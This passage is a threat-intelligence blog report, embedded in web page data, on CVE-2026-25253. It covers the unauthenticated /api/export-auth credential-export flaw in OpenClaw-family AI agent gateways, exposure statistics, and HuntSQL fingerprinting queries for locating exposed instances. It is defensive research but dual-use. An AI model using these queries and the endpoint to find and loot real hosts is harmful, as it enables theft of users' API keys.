	<link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/rolldown-runtime.CNOWq4Kh.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/react.BvkqCsrX.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/framer.CP-k_x7z.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/motion.BzULZdV3.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/dknElRkvg-22SF2vyXWww5C2a1qHoqV5eB7MVobfWR0.CrNMsudo.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/shared.BWEhv4No.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/shared-lib.CMPmv1wn.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/e0PIB6q2J.gBnBi_3x.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/New_Markdown.BxgkjFY6.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/[email withheld by Lighthouse]"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/qecXhJB8l.BWPWGov8.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/AfIHGP5Pm.zXjLkiK8.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/pqgOUIDM1.CMh_nNY4.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/tUx_ojDqh.BjRLVaUv.mjs"><link rel="modulepreload" fetchpriority="low" href="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/ygqkE9qER.BO71eucH.mjs"><script type="module" async data-framer-bundle="main" fetchPriority="low" src="https://framerusercontent.com/sites/6JIWbys4J7luUrNMA4Ci7w/script_main.BnTLwUY-.mjs"></script><script type="framer/handover" id="__framer__handoverData">[{"0":1,"1":126},["Map",2,3,40,41,103,104,110,111,113,114,115,116,117,118,119,120,121,122,123,124],"{\"from\":\"4304de0f-b5d3-4ae3-9b63-6ce43cef57ef\",\"select\":[{\"collection\":\"ygqkE9qER\",\"name\":\"EElOb1aRp\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"iDOu5XxRP\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"t0zEknmSP\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"A3G6ap6Cv\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"mnXb_w3Si\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"de1R1GSeH\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"hcz6FLtKi\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"pcwLs_KYv\",\"type\":\"Identifier\"},{\"alias\":\"UfBVup9rD\",\"arguments\":[{\"from\":\"4304de0f-b5d3-4ae3-9b63-6ce43cef57ef\",\"orderBy\":[{\"arguments\":[{\"collection\":\"ygqkE9qER\",\"name\":\"UfBVup9rD\",\"type\":\"Identifier\"},{\"collection\":\"UfBVup9rD\",\"name\":\"id\",\"type\":\"Identifier\"}],\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"UfBVup9rD\",\"name\":\"id\",\"type\":\"Identifier\"}],\"type\":\"Select\",\"where\":{\"left\":{\"collection\":\"UfBVup9rD\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"collection\":\"ygqkE9qER\",\"name\":\"UfBVup9rD\",\"type\":\"Identifier\"},\"type\":\"BinaryOperation\"}}],\"functionName\":\"FLAT_ARRAY\",\"type\":\"FunctionCall\"},{\"collection\":\"ygqkE9qER\",\"name\":\"ei2alncPv\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"uP83fYRIY\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"gciLIomRv\",\"type\":\"Identifier\"},{\"collection\":\"ygqkE9qER\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"type\":\"BinaryOperation\",\"operator\":\"==\",\"left\":{\"type\":\"TypeCast\",\"value\":{\"type\":\"Identifier\",\"name\":\"iDOu5XxRP\",\"collection\":\"ygqkE9qER\"},\"dataType\":\"STRING\"},\"right\":{\"type\":\"LiteralValue\",\"value\":\"cve-2026-25253-openclaw-ai-agent-exposure\"}}}default",[4],{"EElOb1aRp":5,"iDOu5XxRP":8,"t0zEknmSP":10,"A3G6ap6Cv":11,"mnXb_w3Si":13,"de1R1GSeH":16,"hcz6FLtKi":19,"pcwLs_KYv":25,"UfBVup9rD":30,"ei2alncPv":33,"uP83fYRIY":35,"gciLIomRv":37,"id":38},{"type":6,"value":7},"string","Hunting OpenClaw Exposures: CVE-2026-25253 in Internet-Facing AI Agent Gateways",{"type":6,"value":9},"cve-2026-25253-openclaw-ai-agent-exposure",{"type":6,"value":7},{"type":6,"value":12},"Our research team identified over 17,500 internet-exposed OpenClaw, Clawdbot, and Moltbot instances vulnerable to CVE-2026-25253. This report documents detection methods and infrastructure analysis using Hunt.io",{"type":14,"value":15},"boolean",false,{"type":17,"value":18},"date","2026-02-03T00:00:00.000Z",{"type":20,"value":21},"responsiveimage",{"src":22,"srcSet":23,"pixelWidth":24,"pixelHeight":24},"https://framerusercontent.com/images/3gX2XTcHLllfjyFls5YCvmpDo.png?width=540&height=540","https://framerusercontent.com/images/3gX2XTcHLllfjyFls5YCvmpDo.png?scale-down-to=512&width=540&height=540 512w,https://framerusercontent.com/images/3gX2XTcHLllfjyFls5YCvmpDo.png?width=540&height=540 540w",540,{"type":20,"value":26},{"src":27,"srcSet":28,"pixelWidth":29,"pixelHeight":24},"https://framerusercontent.com/images/o8sU0BI7YalmYgCXBfLSxRefgEU.png?width=1440&height=540","https://framerusercontent.com/images/o8sU0BI7YalmYgCXBfLSxRefgEU.png?scale-down-to=512&width=1440&height=540 512w,https://framerusercontent.com/images/o8sU0BI7YalmYgCXBfLSxRefgEU.png?scale-down-to=1024&width=1440&height=540 1024w,https://framerusercontent.com/images/o8sU0BI7YalmYgCXBfLSxRefgEU.png?width=1440&height=540 1440w",1440,{"type":31,"value":32},"array",[],{"type":6,"value":34},"In reaction to the recent CVE-2026-25253, our research team set out to understand how this vulnerability appears in real-world deployments and what could be identified at internet scale using Hunt.io.\n\nOur analysis focused on internet-exposed browser automation frameworks affected by CVE-2026-25253, including OpenClaw and its forks Clawdbot and Moltbot, which expose web-based control interfaces that store API credentials for multiple AI services. When deployed without proper access controls, these interfaces are directly reachable from the public internet.\n\nIn this report, our team outlines how exposed OpenClaw instances were identified at scale, the infrastructure patterns behind those deployments, and the detection techniques used to fingerprint vulnerable instances using Hunt.io's SQL-based search capabilities.\n\nKey Findings\n------------\n\n-   Identified over 17,500 exposed instances of OpenClaw, Clawdbot, and Moltbot vulnerable to CVE-2026-25253.\n\n-   The vulnerability allows unauthenticated access to stored API tokens via the /api/export-auth endpoint.\n\n-   Affected instances store credentials for Claude, OpenAI, Google AI, and other AI services.\n\n-   Clawdbot Control represents 68.9% of identified deployments, followed by Moltbot Control (22.3%) and OpenClaw Control (8.8%).\n\n-   Exposed instances were observed across 52 countries, with the highest concentrations in the United States and China.\n\n-   98.6% of deployments run on cloud or hosting infrastructure, primarily DigitalOcean, Alibaba Cloud, and Tencent.\n\n-   While port 18789 is the most common, many instances also run on ports 80 and 443, often behind reverse proxies.\n\n-   Multiple detection methods were validated, including HTML title matching, HTTP header hashing, body hashing, asset fingerprinting, TLS certificate fingerprints, and content-length analysis.\n\nTo provide context for these findings, the following section outlines what OpenClaw is and how its control interface is typically deployed.\n\nWhat is OpenClaw?\n-----------------\n\n[OpenClaw](https://github.com/openclaw/openclaw) (and its popular forks Clawdbot and Moltbot) is an open-source browser automation framework designed to connect large language models like Claude and GPT-4 to web browsers through the Playwright automation library. Users configure the framework with their API keys to enable AI agents to autonomously browse websites, fill out forms, extract data, and perform complex web-based tasks.\n\nThe framework exposes a web-based control panel typically accessible on port 18789 that provides a graphical interface for managing automation sessions, viewing real-time browser activity, configuring AI model parameters, and storing authentication credentials. This control panel is the primary attack surface for CVE-2026-25253.\n\n__The Vulnerability__: [CVE-2026-25253](https://nvd.nist.gov/vuln/detail/CVE-2026-25253) affects all versions of OpenClaw before the security patch. The /api/export-auth endpoint was designed to allow users to back up their stored credentials, but the endpoint lacks any authentication or authorization checks. This means anyone who can reach the service over the network can extract all stored API tokens, including keys for Claude, OpenAI, Google AI, and other services.\n\nTo assess the scope of this exposure, our research team analyzed how OpenClaw and its forks are distributed across deployed variants.\n\nFramework Distribution\n----------------------\n\nThe affected software ecosystem consists of three related browser automation frameworks sharing a common codebase derived from the original OpenClaw project. \n\nThe analysis of 17,470 instances with identifiable HTML titles reveals that Clawdbot Control is the dominant variant at 68.9% of all deployments, followed by Moltbot Control at 22.3% and the original OpenClaw Control at 8.8%.\n\nFrom a threat hunting perspective, this means detection rules must account for all three title variants to achieve comprehensive coverage. The prevalence of Clawdbot suggests it has become the most actively maintained fork, which may also make it the most likely to receive a timely security patch for CVE-2026-25253.\n\n![Figure 1: Framework Distribution Across 17,470 Identified Instances](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Article_img_Framework+Distribution+17%2C470+Total+Instances.png)\n\n###### Figure 1: Framework Distribution Across 17,470 Identified Instances\n\n### Geographic Distribution\n\nUsing [Hunt.io Bulk IP Enrichment](https://hunt.io/features/bulk-enrichment) of 2,500 unique IP addresses through geolocation and ASN analysis reveals the global spread of vulnerable OpenClaw deployments across 52 countries.\n\nThe United States leads with 891 instances (35.6%), driven primarily by DigitalOcean data centers in Santa Clara and Clifton. China follows with 648 instances (25.9%), concentrated across Alibaba Cloud and Tencent infrastructure in Beijing, Hangzhou, and Shanghai.\n\n![Figure 2: Bulk extraction and enrichment results showing 2,500 unique IPv4 addresses](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+2.png)\n\n###### Figure 2: Bulk extraction and enrichment results showing 2,500 unique IPv4 addresses\n\nEuropean and Asian hosting hubs account for the remaining deployments, with Germany (6.6%), Singapore (6.5%), and Hong Kong (4.4%) serving as significant regional nodes. \n\nThis concentration aligns with how browser automation workloads are typically deployed, requiring persistent compute resources and stable network connectivity.\n\n![Figure 3: Geographic Distribution of Exposed Instances by Country (Top 10)](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Article_img_Geographic+Distribution+of+Exposed+Instances+(%D0%A2%D0%BE%D1%80+10+Countries).png)\n\n###### Figure 3: Geographic Distribution of Exposed Instances by Country (Top 10)\n\n### Top Cities\n\nCity-level analysis reveals that exposed instances cluster around major cloud provider data center locations rather than traditional enterprise hubs. Santa Clara leads with 250 instances corresponding to DigitalOcean and cloud infrastructure in Silicon Valley, while Clifton, New Jersey, accounts for 207 instances on East Coast hosting platforms. In China, Beijing (214), Hangzhou (121), Shanghai (119), and Guangzhou (97) collectively represent substantial Alibaba Cloud and Tencent deployments.\n\n![Figure 4: Top 10 Cities Hosting Vulnerable OpenClaw Instances](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Article_img_Top+Cities+by+Exposure+(Enriched+IP+Analysis).png)\n\n###### Figure 4: Top 10 Cities Hosting Vulnerable OpenClaw Instances\n\n### Infrastructure Providers\n\nASN analysis confirms that 98.6% of exposed instances run on commercial hosting and cloud infrastructure, with only 20 instances on ISP networks and 16 on business-class connections. DigitalOcean is the single largest host with 880 instances (35.2%), followed by Alibaba Cloud entities collectively hosting 660 instances (26.4%) across their Hangzhou and US-based data centers. Tencent rounds out the top three with 307 combined instances (12.3%).\n\n![Figure 5: Top 10 Infrastructure Providers Hosting Vulnerable Instances](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Article_img_Infrastructure+Providers+(Top+10+by+Instance+Count).png)\n\n###### Figure 5: Top 10 Infrastructure Providers Hosting Vulnerable Instances\n\nThe dominance of cloud hosting providers indicates that most OpenClaw deployments are intentional server-side installations rather than accidental exposures from desktop applications. This also means that cloud provider security teams and abuse departments could play a significant role in driving remediation by notifying affected customers of the exposed vulnerability.\n\n\n![Figure 6: ASN Type Distribution - 98.6% Hosted on Cloud/Hosting Infrastructure](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Article_img_ASN+Type+Distribution.png)\n\n###### Figure 6: ASN Type Distribution - 98.6% Hosted on Cloud/Hosting Infrastructure\n\nBeyond hosting providers, port usage patterns provide additional insight into how these instances are exposed and accessed.\n\n### Port Distribution\n\nPort analysis across all 17,470 identified instances reveals that while the default port 18789 accounts for the largest share at 47.3% (8,258 instances), a substantial number of deployments run on standard web ports. HTTP port 80 hosts 30.1% (5,263 instances) and HTTPS port 443 hosts 18.9% (3,299 instances), indicating widespread use of reverse proxies like nginx to front the application.\n\nThe presence of instances on non-standard ports such as 18888 (243 instances) and 8080 (100 instances) suggests custom deployment configurations that may require additional hunting rules. Defenders should note that port-filtered queries targeting only 18789 and 18791 will miss approximately half of all exposed instances, making title-based and body-hash detection methods essential for comprehensive coverage.\n\n![Figure 7: Port Distribution Across All Identified Instances](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Article_img_Port+Distribution.png)\n\n###### Figure 7: Port Distribution Across All Identified Instances\n\nBased on these exposure patterns, our research team developed multiple detection strategies to identify vulnerable OpenClaw instances at scale.\n\nHunting Methodology\n-------------------\n\nUsing [Hunt.io's powerful SQL-based search](https://hunt.io/features/hunt-sql) against our comprehensive internet scanning database, we analyzed exposed OpenClaw instances across the global internet.\n\nThe following sections document each fingerprinting technique with the exact HuntSQL queries used, along with screenshots showing real-world results. Security teams can adapt these queries for their own threat hunting operations to identify potentially vulnerable assets within their network perimeter or among their cloud infrastructure.\n\n### Detection Strategy 1: HTML Title Matching\n\nThe most straightforward and reliable fingerprint for identifying OpenClaw instances is the HTML page title returned by the web control panel. Each fork of the framework uses a distinctive title that clearly identifies the variant: \"Clawdbot Control\" for the original framework, \"Moltbot Control\" for the Chinese fork, and \"OpenClaw Control\" for the community rebrand. These titles remain consistent across deployments and are rarely modified by operators.\n\nWe tested two query approaches for maximum coverage. The first uses a simple LIKE pattern matching with wildcards to catch each variant separately. \n\n__Query (LIKE method):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE html.head.title LIKE '%Clawdbot Control%'\n   OR html.head.title LIKE '%OpenClaw Control%'\n   OR html.head.title LIKE '%Moltbot Control%'\n```\n\nSample output:\n\n![Figure 8: HTML Title Search using LIKE - 17,587 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+8.png)\n\n###### Figure 8: HTML Title Search using LIKE - 17,587 Results\n\nThe second uses RLIKE with a case-insensitive regular expression to capture all three variants in a single query. \n\n__Query (RLIKE regex method):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE html.head.title RLIKE '(?i)(clawdbot|moltbot|openclaw).*control'\n```\n\nOutput example:\n\n![Figure 9: HTML Title Search using RLIKE (Regex) - 17,590 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+9.png)\n\n###### Figure 9: HTML Title Search using RLIKE (Regex) - 17,590 Results\n\nBoth approaches proved highly effective, with the regex query returning slightly more results due to its ability to match variations in capitalization and spacing.\n\nThis method stands out because it requires no prior knowledge of specific hash values or fingerprints - it directly identifies the application by its self-declared identity. The results show exposed instances running on a wide variety of ports beyond the default, indicating that many operators attempt security through obscurity by changing the listening port.\n\nThe regex query captured 17,590 instances across all three variants. Results reveal instances running on various non-standard ports, including 80, 443, 8080, 8081, 9009, 18888, and the default 18789, demonstrating that port-based filtering alone is insufficient for comprehensive detection.\n\n### Detection Strategy 2: HTTP Header Fingerprinting\n\nHTTP response headers provide another reliable fingerprinting vector because web servers and application frameworks produce consistent header patterns. OpenClaw instances share characteristic header combinations due to their common Vite-based frontend build system and Express.js backend. \n\nBy computing Murmur3 hashes of the response headers, we can efficiently search for matching patterns across billions of HTTP responses in our database.\n\nWe tested three different header hash variants to understand their effectiveness: normalized headers (standardized ordering and formatting), sorted headers (alphabetically ordered), and unique headers (deduplicated header names). Each variant captures slightly different aspects of the HTTP response signature, but all three converge on the same set of approximately 8,260 instances when filtered to the default port.\n\nThe consistency across all three hash types validates the reliability of header-based fingerprinting for this target. The hash values were extracted from confirmed OpenClaw instances during our initial reconnaissance phase, then used as search signatures to discover additional exposed deployments at scale.\n\nThe following query matches normalized HTTP header hashes extracted from confirmed OpenClaw instances.\n\n__Query (Normalized Header Hash):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE http.headers.normalized.hash.murmur3 IN (\n    '01D737B6D4249593',\n    'A21D8F4148A7091A',\n    'B5B27B39C533B437',\n    '75530A6460E2396C',\n    '21DFA63A75ACFD53',\n    'D263AF8ACFBCB72B',\n    'A905FF566F28EC67',\n    '2227E50E61F4757E',\n    '91794924F783020C',\n    'D417839C4651FBDE'\n) AND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 10: Sorted Header Hash (Murmur3) - 8,260 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+10.png)\n\n###### Figure 10: Sorted Header Hash (Murmur3) - 8,260 Results\n\nThe following variant uses alphabetically sorted headers to validate consistency across different hash representations.\n\n__Query (Sorted Header Hash):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE http.headers.sorted.hash.murmur3 IN (\n    'DD4CFCD07F4353B4',\n    'A72AAF0B3DE14AA4',\n    '91A4568E49C151BA',\n    'DF5040A37382F1F6',\n    'D2640C3EB53C36F4',\n    'F835AFA576840DF9',\n    '8E635B9BC1DD3797',\n    '752822D238ABE472',\n    '5D81B30A0BA1F358',\n    '59F09999D5747AD9'\n) AND port IN (18789, 18791)\n```\n\n![Figure 11: Unique Header Hash (Murmur3) - 8,260 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+11.png)\n\n###### Figure 11: Unique Header Hash (Murmur3) - 8,260 Results\n\nThis version relies on deduplicated header names to confirm the same fingerprint using a minimal header set.\n\n__Query (Unique Header Hash):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE http.headers.unique.hash.murmur3 IN (\n    '01D737B6D4249593',\n    'A21D8F4148A7091A',\n    'B5B27B39C533B437',\n    '75530A6460E2396C',\n    '21DFA63A75ACFD53',\n    'D263AF8ACFBCB72B',\n    'A905FF566F28EC67',\n    '2227E50E61F4757E',\n    '91794924F783020C'\n) AND port IN (18789, 18791)\n```\n\nAll three header hash approaches identified 8,260 instances on the default port 18789. The consistency across hash types confirms that OpenClaw deployments maintain uniform header signatures, making this an excellent method for high-confidence detection with minimal false positives.\n\n### Detection Strategy 3: Redacted Header Hash (SHA256)\n\nSHA256 hashes of redacted HTTP headers offer another fingerprinting approach that strips variable content like timestamps and session identifiers before computing the hash. This technique is particularly useful for identifying applications that include dynamic values in their headers, as the redaction process normalizes these variations. For OpenClaw instances, the redacted header hash provides a stable identifier even when server timestamps or cache headers change between requests.\n\nWhen combined with CVE-specific port filtering targeting ports 18789 and 18791, this approach identified 7,130 instances. The port filter is essential for reducing false positives, as the header hash alone might match other applications using similar server configurations. Port 18789 is the default gateway API port where the vulnerable /api/export-auth endpoint is exposed, while port 18791 hosts the browser automation control interface.\n\nThe next query applies redacted header hashing to account for dynamic header values while retaining a stable fingerprint.\n\n__Query:__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE http.headers.redacted.hash.sha256 IN (\n    'f3fa269c7c4a677782495c3d4ef3854fcbcf78ac286602969fab25b9f0e06f11',\n    '567d4fab01006f75e78b7fe5db8c485bb468d7e28edc4258c1568583e3867157',\n    'b2de3e48e1a8074e530c932b8ea2531401a78d4d2f28b9eef0461fae13abbd87',\n    'ef1f9347760d317fdcb7f65c2a53d1fe0efd901648858412f7089b4b7fd434f5',\n    '3a9b51aaeb0062ef7fade4594149a605cd9796a7c9745d75ba646fe0efd2e3c5',\n    '776becf0a492a830c10787e589743d42616ca308d5ec375282678e6ed40ae13d'\n)\nAND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 12: Redacted Header Hash (SHA256) with Port Filter - 7,130 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+12.png)\n\n###### Figure 12: Redacted Header Hash (SHA256) with Port Filter - 7,130 Results\n\n### Detection Strategy 4: HTML Body Hashing\n\nThe OpenClaw web interface produces consistent HTML output because it is built using Vite with a React frontend that generates deterministic builds. By computing hashes of the HTML response body, we can create stable fingerprints that identify instances regardless of the HTTP headers they return. This approach is particularly effective for detecting instances running behind reverse proxies or load balancers that may modify header values.\n\nWe employed three complementary hash algorithms for body fingerprinting. SHA256 provides cryptographically strong exact matching for unmodified deployments. Murmur3 offers faster computation for large-scale scanning operations. TLSH (Trend Micro Locality Sensitive Hash) enables fuzzy matching that can detect modified versions of the framework with minor HTML changes, making it invaluable for finding customized or obfuscated deployments.\n\nThe body hashing approach identified approximately 6,800 instances across all three algorithms. The slight variation in results between hash types reflects differences in how each algorithm handles whitespace and encoding variations. TLSH is particularly valuable for detecting instances where operators have made cosmetic modifications to the interface.\n\nThe following query uses exact SHA256 hashes of the HTML body to identify unmodified OpenClaw deployments.\n\n__Query (SHA256 Body Hash):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE html.body.hash.sha256 IN (\n    'DECF58D16C7436B434ED551703F510564AA5E17C19E9CAC5220E0A257DC5D55D',\n    '796A9FC9101556A326DBD2B18790EDD6FAF20A38FBFE260C855FDE9560801661',\n    '995880C9E738FFE27183671D515FBA80DDB14DDBACE728E91568499B95724CDF',\n    '57B7EDD7DDB95F9DC4C4CC6F1976BCEA781AE134B10E013B9EBC390007C3A5F6',\n    '9A2EB53F0F3526ED528B342C8300C0BD25312F23B1F22471617E6FEBC32E0B83',\n    'F9BCCE51878B4B206F4F9B878F0A93E022E0E3C5C1739851FFA1ED474C865575',\n    'E0726B08D60A26BC0CCC3B935959D53655B008619B2B28BC4D0163C8791E415E'\n)\nAND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 13: Body Hash (SHA256) with Port Filter - 6,801 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+13.png)\n\n###### Figure 13: Body Hash (SHA256) with Port Filter - 6,801 Results\n\nThis variant applies Murmur3 body hashing to support faster matching across large datasets.\n\n__Query (Murmur3 Body Hash):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE html.body.hash.murmur3 IN (\n    '2683260611',\n    '2640755433',\n    '885981446',\n    '3742799908',\n    '1008552787',\n    '743781550',\n    '44186107',\n    '1133263748',\n    '1208028788'\n)\nAND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 14: Body Hash (Murmur3) - 6,839 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+14.png)\n\n###### Figure 14: Body Hash (Murmur3) - 6,839 Results\n\nThis approach uses TLSH fuzzy hashing to identify instances with minor HTML modifications or customized builds.\n\n__Query (TLSH Fuzzy Body Hash):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE html.body.hash.tlsh IN (\n    'dc019e0158a08a3773a4432815e6fd186e52a2434789ea4475dbb07d0fc5b93c9db4ec',\n    '4e01fe0198a08e1733b4423419b6f8482e6262470789da4075da703c4ec9ba2c9db4f8',\n    '09019e4198a08a3773a44422419e6fc186e62a243038def4475db703d1ec5ba2c9db4ec',\n    '72011241889089l733a093388ba3bc249a42a24b4b1a5f4435c6307d6fe4fd34ddf4f8',\n    'a9011241c8d08d1723a092348ba3bc649a42a24b4b1a5f4435c6307d6fe4bd389df4f8',\n    'e601fe0188a08e1733b4422419e2f8582e666143038ada4075da703c4ec8ba2c9db4f8',\n    '0801fe0188a08e1733b4422415a6f8482e626143038ada4075da703d1fc8ba2c9db4f8',\n    '1501230818e1733f4423419e2fc482e626143038ada4075da703c0fc8ba2cddb4fc',\n    '5b019e0598a08a3773b4432815e7fc186e52a2434789eb4475dfb03d0ec5b82c9db4dc'\n)\nAND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 15: Body Hash (TLSH Fuzzy) with Port Filter - 6,839 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+15.png)\n\n###### Figure 15: Body Hash (TLSH Fuzzy) with Port Filter - 6,839 Results\n\n### Detection Strategy 5: JavaScript and CSS Asset Fingerprints\n\nModern web applications built with bundlers like Vite include content-addressed asset filenames that incorporate hash values derived from the file contents. For OpenClaw, this means each version release produces unique JavaScript and CSS filenames such as \"index-Cl-Y9zqE.js\" or \"index-DEPfFcOb.css\". These hashed filenames serve as version-specific identifiers that remain constant across all deployments of the same build.\n\nBy searching for these distinctive asset filenames within the HTML body content, we can identify OpenClaw instances and even determine which specific version they are running. This information is valuable for vulnerability assessment, as different versions may have different security patches applied. The asset fingerprinting approach found over 8,000 instances, providing strong coverage across the deployed population.\n\nThis approach remains effective even when minor interface changes are introduced, since asset hashes are embedded in the build process and require a full rebuild to change. Security teams can use these fingerprints to track version distribution and prioritize patching efforts for older, more vulnerable releases.\n\nThe next query identifies OpenClaw instances by matching version-specific JavaScript asset filenames embedded in the HTML.\n\n__Query (JavaScript Assets):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE (\n    html.body.content LIKE '%index-Cl-Y9zqE.js%'\n    OR html.body.content LIKE '%index-5xhVxegE.js%'\n    OR html.body.content LIKE '%index-BCK1V83p.js%'\n    OR html.body.content LIKE '%index-DFDgq9AK.js%'\n    OR html.body.content LIKE '%index-CXUONUC9.js%'\n    OR html.body.content LIKE '%index-CxUFDXFX.js%'\n    OR html.body.content LIKE '%index-Bb7zaWmQ.js%'\n    OR html.body.content LIKE '%index-DsXRcnEw.js%'\n    OR html.body.content LIKE '%index-CxUwHlqZ.js%'\n    OR html.body.content LIKE '%index-kjHVNdSc.js%'\n    OR html.body.content LIKE '%index-RnF4fdeM.js%'\n) AND port IN (18789, 18791)\n```\n\nOutput example: \n\n![Figure 16: JavaScript Asset Fingerprints - 8,164 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+16.png)\n\n###### Figure 16: JavaScript Asset Fingerprints - 8,164 Results\n\nThe following query applies the same technique using hashed CSS asset filenames to expand version coverage.\n\n__Query (CSS Assets):__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE (\n    html.body.content LIKE '%index-DEPfFcOb.css%'\n    OR html.body.content LIKE '%index-BAFzd9IE.css%'\n    OR html.body.content LIKE '%index-CjW_qQ45.css%'\n    OR html.body.content LIKE '%index-BKPyesll.css%'\n    OR html.body.content LIKE '%index-BvhR9FCb.css%'\n    OR html.body.content LIKE '%index-BZkju1RS.css%'\n    OR html.body.content LIKE '%index-CIRDm-Lu.css%'\n    OR html.body.content LIKE '%index-O8nzABV3.css%'\n)\nAND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 17: CSS Asset Fingerprints with Port Filter - 8,206 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+17.png)\n\n###### Figure 17: CSS Asset Fingerprints with Port Filter - 8,206 Results\n\n### Detection Strategy 6: TLS Certificate Fingerprints (JA4X)\n\nJA4X is a TLS certificate fingerprinting method that creates unique identifiers based on certificate properties including the issuer, subject, and extension information. For OpenClaw instances configured with TLS encryption, these certificate fingerprints provide a reliable identification mechanism that operates at the transport layer, independent of any HTTP-level 